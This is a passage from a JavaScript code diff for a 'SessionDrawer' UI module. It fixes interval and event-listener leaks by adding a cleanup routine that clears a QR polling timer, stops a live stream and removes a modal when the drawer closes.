             clearInterval(_liveQrPoll);
+            _liveQrPoll = null;
           }
         }, 200);
-        setTimeout(() => clearInterval(_liveQrPoll), 5000);
+        setTimeout(() => { if (_liveQrPoll) { clearInterval(_liveQrPoll); _liveQrPoll = null; } }, 5000);
       }
 
       if (liveQrToggle && liveQrBody) {
@@ -1506,6 +1523,17 @@ const SessionDrawer = (() => {
         });
       }
 
+      // Register cleanup so close() or re-open tears down modal, intervals, stream & keydown listeners
+      _activeCleanup = () => {
+        if (_liveQrPoll) { clearInterval(_liveQrPoll); _liveQrPoll = null; }
+        _liveQrStop();
+        if (_modalEscHandler) {
+          document.removeEventListener('keydown', _modalEscHandler);
+          _modalEscHandler = null;
+        }
+        if (_modalEl) { _modalEl.remove(); _modalEl = null; _modalElements = null; }
+      };
+
     } catch (err) {
       console.error('openDetail error:', err);
       panel.innerHTML = `
@@ -1524,6 +1552,7 @@ const SessionDrawer = (() => {
   }
 
   function close() {
+    _runCleanup();
     const overlay = document.getElementById('detail-overlay');
     if (overlay) overlay.style.display = 'none';
 
